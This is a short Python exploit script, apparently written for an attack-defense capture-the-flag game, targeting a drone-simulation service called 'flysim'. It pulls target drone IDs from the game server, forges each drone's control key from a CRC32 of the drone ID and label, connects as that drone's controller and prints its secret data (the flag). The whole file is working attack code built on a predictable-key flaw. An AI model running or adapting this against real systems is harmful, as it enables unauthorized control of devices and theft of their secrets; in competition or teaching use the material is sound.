#!/usr/bin/env python3

import requests
import sys
import drone_client
import time
import json
import zlib


def droneid_to_drone_obj(client, drone_id):
    det = client.get_drones_with_details(json.dumps([{"$match": {}}]))
    for d in det:
        if d["id"] == drone_id:
            return d
    return None


IP = sys.argv[1]
drone_ids = requests.get("http://10.10.10.10/api/client/attack_data/").json()["flysim"][
    IP
]
for drone_id in drone_ids[::-1]:
    client = drone_client.DroneClient(ip=IP)
    drone_obj = droneid_to_drone_obj(client, drone_id)
    client.drone_id = drone_id
    cont_key = hex(zlib.crc32((drone_id + drone_obj["label"]).encode()))[
        2:
    ]  # generate 'not so random' control_key
    client.control_key = cont_key
    client.connect_to_drone()

    drone_obj_with_secret = client.wait_for_data_msg(timeout=30)
    print(drone_obj_with_secret["secret_data"], flush=True)
